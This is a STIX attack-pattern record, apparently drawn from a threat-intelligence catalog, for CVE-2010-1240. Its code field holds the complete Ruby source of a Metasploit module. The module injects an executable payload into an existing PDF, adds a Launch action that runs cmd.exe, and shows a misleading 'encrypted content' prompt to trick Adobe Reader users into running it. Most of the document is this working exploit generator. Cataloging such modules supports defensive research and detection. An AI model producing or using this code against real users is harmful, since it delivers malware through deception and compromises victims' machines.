{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6e2c1840-947e-435c-bdd1-c797e614aa84",
    "created": "2024-08-14T16:38:17.76513Z",
    "modified": "2024-08-14T16:38:17.765134Z",
    "name": "Adobe PDF Embedded EXE Social Engineering",
    "description": " This module embeds a Metasploit payload into an existing PDF file. The resulting PDF can be sent to a target as part of a social engineering attack.  'License'\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_pdf_embedded_exe.rb",
            "external_id": "adobe_pdf_embedded_exe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1240"
        },
        {
            "source_name": "reference",
            "url": "http://blog.didierstevens.com/2010/04/06/update-escape-from-pdf/"
        },
        {
            "source_name": "reference",
            "url": "http://blog.didierstevens.com/2010/03/31/escape-from-foxit-reader/"
        },
        {
            "source_name": "reference",
            "url": "http://blog.didierstevens.com/2010/03/29/escape-from-pdf/"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb10-15.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::PDF_Parse\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Adobe PDF Embedded EXE Social Engineering',\n      'Description' \t=> %q{\n          This module embeds a Metasploit payload into an existing PDF file. The\n        resulting PDF can be sent to a target as part of a social engineering attack.\n      },\n      'License'\t=> MSF_LICENSE,\n      'Author'\t=>\n        [\n          'Colin Ames <amesc[at]attackresearch.com>', # initial module\n          'jduck' # add Documents for vista/win7\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-1240' ],\n          [ 'OSVDB', '63667' ],\n          [ 'URL', 'http://blog.didierstevens.com/2010/04/06/update-escape-from-pdf/' ],\n          [ 'URL', 'http://blog.didierstevens.com/2010/03/31/escape-from-foxit-reader/' ],\n          [ 'URL', 'http://blog.didierstevens.com/2010/03/29/escape-from-pdf/' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-15.html' ]\n        ],\n      'DisclosureDate' => '2010-03-29',\n      'Payload'\t=>\n        {\n          'Space'\t\t\t    => 2048,\n          'DisableNops'\t\t=> true,\n          'StackAdjustment'\t=> -3500,\n        },\n      'Platform'\t=> 'win',\n      'Targets'\t=>\n        [\n          [ 'Adobe Reader v8.x, v9.x / Windows XP SP3 (English/Spanish) / Windows Vista/7 (English)', { 'Ret' => '' } ]\n        ],\n      'DefaultTarget'\t=> 0))\n\n    register_options(\n      [\n        OptPath.new('INFILENAME', [ true, 'The Input PDF filename.', ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2010-1240', 'template.pdf') ]),\n        OptString.new('EXENAME', [ false, 'The Name of payload exe.']),\n        OptString.new('FILENAME', [ false, 'The output filename.', 'evil.pdf']),\n        OptString.new('LAUNCH_MESSAGE', [ false, 'The message to display in the File: area',\n          \"To view the encrypted content please tick the \\\"Do not show this message again\\\" box and press Open.\"]),\n      ])\n  end\n\n  def exploit\n\n    file_name = datastore['INFILENAME']\n    exe_name = datastore['EXENAME']\n\n    print_status(\"Reading in '#{file_name}'...\")\n    stream = read_pdf()\n\n    begin\n      print_status(\"Parsing '#{file_name}'...\")\n      pdf_objects      = parse_pdf(stream)\n      xref_trailers    = pdf_objects[0]\n      trailers         = pdf_objects[1]\n      startxrefs       = pdf_objects[2]\n      root_obj         = pdf_objects[3]\n\n      output = basic_social_engineering_exploit({\n        :xref_trailers => xref_trailers,\n        :root_obj => root_obj,\n        :stream => stream,\n        :trailers => trailers,\n        :file_name => file_name,\n        :exe_name => exe_name,\n        :startxref => startxrefs.last\n      })\n\n      print_good(\"Parsing Successful. Creating '#{datastore['FILENAME']}' file...\")\n      file_create(output)\n    rescue KeyError => e\n      # Lazy fix:\n      # Similar to the problem with NoMethod -- something we need is missing in the PDF.\n      # But really what happens is the module trusts the PDF too much.\n\n      # Don't be sorry, you're a beautiful human we all appreciate greatly\n      print_error(\"Sorry, I'm picky. Incompatible PDF structure. Please try a different PDF template.\")\n      elog('Sorry, I\\'m picky. Incompatible PDF structure', error: e)\n    rescue NoMethodError => e\n      # Lazy fix:\n      # When a NoMethod error is hit, that means that something in the PDF is actually missing,\n      # so we can't parse it. If we can't parse it properly, then we can't garantee the exploit\n      # will work, either.  So we might as well just reject it.\n      print_error(\"Sorry, I'm picky. Incompatible PDF structure, please try a different PDF template.\")\n      elog('Sorry, I\\'m picky. Incompatible PDF structure', error: e)\n    end\n  end\n\n\n  def ef_payload(pdf_name,payload_exe,obj_num)\n\n    if !(payload_exe and payload_exe.length > 0)\n      print_status(\"Using '#{datastore['PAYLOAD']}' as payload...\")\n\n      payload_exe = generate_payload_exe\n      file_size = payload_exe.length\n      stream = Rex::Text.zlib_deflate(payload_exe)\n      md5 = Rex::Text.md5(stream)\n\n    else\n      print_status(\"Using '#{datastore['EXENAME']}' as payload...\")\n\n      file_size = File.size(payload_exe)\n      stream = Rex::Text.zlib_deflate(File.binread(payload_exe))\n      md5 = Rex::Text.md5(File.binread(payload_exe))\n\n    end\n\n    output = String.new()\n\n    output << \"#{obj_num.to_i + 1} 0 obj\\r<</UF(#{pdf_name}.pdf)/F(#{pdf_name}.pdf)/EF<</F #{obj_num.to_i + 2} 0 R>>/Desc(#{pdf_name})/Type/Filespec>>\\rendobj\\r\"\n    output << \"#{obj_num.to_i + 2} 0 obj\\r<</Subtype/application#2Fpdf/Length #{stream.length + 3}/Filter/FlateDecode/DL #{file_size}/Params<</Size #{file_size}/CheckSum<#{md5.upcase}>>>>>\"\n    output << \"stream\\r#{stream}\\r\\nendstream\\rendobj\\r\"\n\n    return output\n  end\n\n  def js_payload(pdf_name,obj_num)\n\n    output = String.new()\n    output << \"#{obj_num.to_i + 3} 0 obj\\r<</S/JavaScript/JS(this.exportDataObject({ cName: \\\"#{pdf_name}\\\", nLaunch: 0 });)/Type/Action>>\\rendobj\\r\"\n    output << \"#{obj_num.to_i + 4} 0 obj\\r<</S/Launch/Type/Action/Win<</F(cmd.exe)/D(c:\\\\\\\\windows\\\\\\\\system32)/P(/Q /C \"\n\n    # change to the home drive/path no matter what\n    output << \"%HOMEDRIVE%&cd %HOMEPATH%\"\n\n    # check for the pdf in these dirs, in this order..\n    dirs = [ \"Desktop\", \"My Documents\", \"Documents\", \"Escritorio\", \"Mis Documentos\" ]\n    dirs.each { |dir|\n      fmt = \"&\"+\n        \"(\"+\n          \"if exist \\\"%s\\\" \"+\n            \"(cd \\\"%s\\\")\"+\n        \")\"\n      fname = \"%s\\\\\\\\#{pdf_name}.pdf\" % dir\n      output << fmt % [fname, dir]\n    }\n    launch_message = datastore['LAUNCH_MESSAGE']\n    lines = []\n    launch_message.gsub(/.{1,80}(?:\\s|\\Z)/) { lines << $& }\n    if (lines.length > 2)\n      print_warning(\"Warning: the LAUNCH_MESSAGE is more than 2 lines. It may not display correctly.\")\n    end\n\n    output << \"&\"+\n      # note: the following doesn't work with spaces, and adding quotes doesn't execute the payload :-/\n      \"(start #{pdf_name}.pdf)\"+\n      # note: The below message modifies the text in the \"File:\" textfield of the \"Launch File\" dialog\n      (\"\\n\"*10) +\n      launch_message+\n      # note: this extra rparen is required.\n      \")\"+\n      \">>>>\\rendobj\\r\"\n\n    return output\n\n  end\n\n\n  def basic_social_engineering_exploit(opts = {})\n\n    xref_trailers = opts[:xref_trailers]\n    root_obj = opts[:root_obj]\n    stream = opts[:stream]\n    trailers = opts[:trailers]\n    file_name = opts[:file_name]\n    exe_name = opts[:exe_name]\n    startxref = opts[:startxref]\n\n    file_name = file_name.split(/\\//).pop.to_s\n\n    match = file_name.match(/(.+)\\.pdf/)\n    if match\n      pdf_name = match[1]\n    end\n\n    catalog = parse_object(xref_trailers,root_obj,stream)\n\n\n    match = catalog.match(/Names (\\d+ \\d) R/m)\n    if match\n\n      names = parse_object(xref_trailers,match[1],stream)\n      match = names.match(/EmbeddedFiles (\\d+ \\d) R/m)\n      if match\n        embedded_files = parse_object(xref_trailers,match[1],stream)\n        new_embedded_files = embedded_files.gsub(/(\\]>>)/m,\"(\\xfe\\xff#{Rex::Text.to_unicode(pdf_name,\"utf-16be\")})#{trailers[0].fetch(\"Size\")} 0 R\" + '\\1')\n      else\n        new_names = names.gsub(/(>>.*)/m,\"/EmbeddedFiles #{trailers[0].fetch(\"Size\")} 0 R\" + '\\1')\n      end\n\n    else\n      new_catalog = catalog.gsub(/(Pages \\d+ \\d R)/m,'\\1' + \"/Names #{trailers[0].fetch(\"Size\")} 0 R\")\n    end\n\n    if catalog.match(/OpenAction/m)\n\n      match = catalog.match(/OpenAction (\\d+ \\d) R/m)\n      if match\n        open_action = \"#{match[1]} R\"\n\n        if new_catalog\n          if new_embedded_files\n            new_catalog = new_catalog.gsub(/OpenAction \\d+ \\d R/m, \"OpenAction #{trailers[0].fetch(\"Size\").to_i + 2} 0 R\")\n          elsif new_names\n            new_catalog = new_catalog.gsub(/OpenAction \\d+ \\d R/m, \"OpenAction #{trailers[0].fetch(\"Size\").to_i + 3} 0 R\")\n          else\n            new_catalog = new_catalog.gsub(/OpenAction \\d+ \\d R/m, \"OpenAction #{trailers[0].fetch(\"Size\").to_i + 4} 0 R\")\n          end\n        else\n          if new_embedded_files\n            new_catalog = catalog.gsub(/OpenAction \\d+ \\d R/m, \"OpenAction #{trailers[0].fetch(\"Size\").to_i + 2} 0 R\")\n          elsif new_names\n            new_catalog = catalog.gsub(/OpenAction \\d+ \\d R/m, \"OpenAction #{trailers[0].fetch(\"Size\").to_i + 3} 0 R\")\n          else\n            new_catalog = catalog.gsub(/OpenAction \\d+ \\d R/m, \"OpenAction #{trailers[0].fetch(\"Size\").to_i + 4} 0 R\")\n          end\n\n        end\n      else\n        if new_catalog\n          new_catalog = new_catalog.gsub(/OpenAction ?\\[.+\\]/m, \"OpenAction #{trailers[0].fetch(\"Size\").to_i + 4} 0 R\")\n        else\n          new_catalog = catalog.gsub(/OpenAction ?\\[.+\\]/m, \"OpenAction #{trailers[0].fetch(\"Size\").to_i + 3} 0 R\")\n        end\n      end\n    else\n      if new_catalog\n        if new_embedded_files\n          new_catalog = new_catalog.gsub(/(Names \\d+ \\d R)/m,'\\1' + \"/OpenAction #{trailers[0].fetch(\"Size\").to_i + 2} 0 R\")\n        elsif new_names\n          new_catalog = new_catalog.gsub(/(Names \\d+ \\d R)/m,'\\1' + \"/OpenAction #{trailers[0].fetch(\"Size\").to_i + 3} 0 R\")\n        else\n          new_catalog = new_catalog.gsub(/(Names \\d+ \\d R)/m,'\\1' + \"/OpenAction #{trailers[0].fetch(\"Size\").to_i + 4} 0 R\")\n        end\n\n      else\n        if new_embedded_files\n          new_catalog = catalog.gsub(/(Pages \\d+ \\d R)/m,'\\1' + \"/OpenAction #{trailers[0].fetch(\"Size\").to_i + 2} 0 R\")\n        elsif new_names\n          new_catalog = catalog.gsub(/(Pages \\d+ \\d R)/m,'\\1' + \"/OpenAction #{trailers[0].fetch(\"Size\").to_i + 3} 0 R\")\n        else\n          new_catalog = catalog.gsub(/(Pages \\d+ \\d R)/m,'\\1' + \"/OpenAction #{trailers[0].fetch(\"Size\").to_i + 4} 0 R\")\n        end\n      end\n    end\n\n    pages_obj = catalog.match(/Pages (\\d+ \\d) R/m)[1]\n    pages = parse_object(xref_trailers,pages_obj,stream)\n\n    page_obj = pages.match(/Kids ?\\[\\r?\\n? *(\\d+ \\d) R/m)[1]\n    page = parse_object(xref_trailers,page_obj,stream)\n\n    match = page.match(/Kids ?\\[\\r?\\n? *(\\d+ \\d) R/m)\n    while match\n\n      page_obj = match[1]\n      page = parse_object(xref_trailers,page_obj,stream)\n      match = page.match(/Kids ?\\[\\r?\\n? *(\\d+ \\d) R/m)\n    end\n\n    match = page.match(/AA<<\\/O (\\d+ \\d) R/m)\n    if match\n      aa = parse_object(xref_trailers,match[1],stream)\n    end\n\n\n    new_pdf = String.new()\n    xrefs = String.new()\n\n\n    if new_embedded_files\n      pdf_payload = String.new()\n      num = trailers[0].fetch(\"Size\").to_i - 1\n      pdf_payload << ef_payload(pdf_name,exe_name,num)\n      pdf_payload << js_payload(pdf_name,num)\n      new_pdf << stream << pdf_payload\n\n      xrefs = xref_create(new_pdf,stream.length,\"*\")\n\n      new_size = trailers[0].fetch(\"Size\").to_i + 4\n\n      if aa\n        new_page = page.gsub(/(AA<<\\/O )\\d+ \\d R(.*)/m,'\\1' + \"#{trailers[0].fetch(\"Size\").to_i + 3} 0\" + '\\2')\n      else\n        new_page = page.gsub(/(>> *\\r?\\n? *endobj)/m,\"/AA<<\\/O #{trailers[0].fetch(\"Size\").to_i + 3} 0 R>>\" + '\\1')\n      end\n\n      new_pdf << new_catalog\n      xrefs << xref_create(new_pdf,(new_pdf.length - new_catalog.length), \"1\")\n\n      new_pdf << new_page\n      xrefs << xref_create(new_pdf,(new_pdf.length - new_page.length), \"1\")\n\n      new_pdf << new_embedded_files\n      xrefs << xref_create(new_pdf,(new_pdf.length - new_embedded_files.length), \"1\")\n\n      if trailers[0].has_key?(\"ID\")\n        new_pdf << \"xref\\r\\n\" << xrefs << \"trailer\\r\\n<</Size #{new_size}/Prev #{startxref}/Root #{trailers[0].fetch(\"Root\")} R/Info #{trailers[0].fetch(\"Info\")} R/ID#{trailers[0].fetch(\"ID\")}>>\\r\\n\"\n      else\n        new_pdf << \"xref\\r\\n\" << xrefs << \"trailer\\r\\n<</Size #{new_size}/Prev #{startxref}/Root #{trailers[0].fetch(\"Root\")} R/Info #{trailers[0].fetch(\"Info\")} R>>\\r\\n\"\n      end\n\n      new_pdf << \"startxref\\r\\n#{stream.length + pdf_payload.length + new_embedded_files.length + new_page.length + new_catalog.length}\\r\\n%%EOF\\r\\n\"\n\n    elsif new_names\n      pdf_payload = String.new()\n      num = trailers[0].fetch(\"Size\").to_i\n      pdf_payload << \"#{num} 0 obj\\r<</Names[(\\xfe\\xff#{Rex::Text.to_unicode(pdf_name,\"utf-16be\")})#{num + 1} 0 R]>>\\rendobj\\r\"\n      pdf_payload << ef_payload(pdf_name,exe_name,num)\n      pdf_payload << js_payload(pdf_name,num)\n      new_pdf << stream << pdf_payload\n\n      xrefs = xref_create(new_pdf,stream.length,\"*\")\n\n      new_size = trailers[0].fetch(\"Size\").to_i + 5\n\n      if aa\n        new_page = page.gsub(/(AA<<\\/O )\\d+ \\d(.*)/m,'\\1' + \"#{trailers[0].fetch(\"Size\").to_i + 4} 0\" + '\\2')\n      else\n        new_page = page.gsub(/(>> *\\r?\\n? *endobj)/m,\"/AA<<\\/O #{trailers[0].fetch(\"Size\").to_i + 4} 0 R>>\" + '\\1')\n      end\n\n      new_pdf << new_catalog\n      xrefs << xref_create(new_pdf,(new_pdf.length - new_catalog.length), \"1\")\n\n      new_pdf << new_page\n      xrefs << xref_create(new_pdf,(new_pdf.length - new_page.length), \"1\")\n\n      new_pdf << new_names\n      xrefs << xref_create(new_pdf,(new_pdf.length - new_names.length), \"1\")\n\n      if trailers[0].has_key?(\"ID\")\n        new_pdf << \"xref\\r\\n\" << xrefs << \"trailer\\r\\n<</Size #{new_size}/Prev #{startxref}/Root #{trailers[0].fetch(\"Root\")} R/Info #{trailers[0].fetch(\"Info\")} R/ID#{trailers[0].fetch(\"ID\")}>>\\r\\n\"\n      else\n        new_pdf << \"xref\\r\\n\" << xrefs << \"trailer\\r\\n<</Size #{new_size}/Prev #{startxref}/Root #{trailers[0].fetch(\"Root\")} R/Info #{trailers[0].fetch(\"Info\")} R>>\\r\\n\"\n      end\n\n      new_pdf << \"startxref\\r\\n#{stream.length + pdf_payload.length + new_names.length + new_page.length + new_catalog.length}\\r\\n%%EOF\\r\\n\"\n\n\n    else\n      pdf_payload = String.new()\n      num = trailers[0].fetch(\"Size\").to_i + 1\n      pdf_payload << \"#{trailers[0].fetch(\"Size\")} 0 obj\\r<</EmbeddedFiles #{num} 0 R>>\\rendobj\\r\"\n      pdf_payload << \"#{num} 0 obj\\r<</Names[(#{pdf_name})#{num + 1} 0 R]>>\\rendobj\\r\"\n      pdf_payload << ef_payload(pdf_name,exe_name,num)\n      pdf_payload << js_payload(pdf_name,num)\n      new_pdf << stream << pdf_payload\n      xrefs = xref_create(new_pdf,stream.length,\"*\")\n\n      new_size = trailers[0].fetch(\"Size\").to_i + 6\n\n      if aa\n        new_page = page.gsub(/(AA<<\\/O )\\d+ \\d(.*)/m,'\\1' + \"#{trailers[0].fetch(\"Size\").to_i + 5} 0\" + '\\2')\n      else\n        new_page = page.gsub(/(>> *\\r?\\n? *endobj)/m,\"/AA<<\\/O #{trailers[0].fetch(\"Size\").to_i + 5} 0 R>>\" + '\\1')\n      end\n\n      new_pdf << new_catalog\n      xrefs << xref_create(new_pdf,(new_pdf.length - new_catalog.length), \"1\")\n\n      new_pdf << new_page\n      xrefs << xref_create(new_pdf,(new_pdf.length - new_page.length), \"1\")\n\n      if trailers[0].has_key?(\"ID\")\n        new_pdf << \"xref\\r\\n\" << xrefs << \"trailer\\r\\n<</Size #{new_size}/Prev #{startxref}/Root #{trailers[0].fetch(\"Root\")} R/Info #{trailers[0].fetch(\"Info\")} R/ID#{trailers[0].fetch(\"ID\")}>>\\r\\n\"\n      else\n        new_pdf << \"xref\\r\\n\" << xrefs\n        new_pdf << \"trailer\\r\\n\"\n        new_pdf << \"<</Size #{new_size}/Prev #{startxref}\"\n        new_pdf << \"/Root #{trailers[0].fetch(\"Root\")} R\"\n        new_pdf << \"/Info #{trailers[0].fetch(\"Info\")} R>>\\r\\n\"\n      end\n\n      new_pdf << \"startxref\\r\\n#{stream.length + pdf_payload.length + new_page.length + new_catalog.length}\\r\\n%%EOF\\r\\n\"\n\n\n    end\n\n\n    return new_pdf\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-29",
    "x_mitre_platforms": [
        "win'"
    ]
}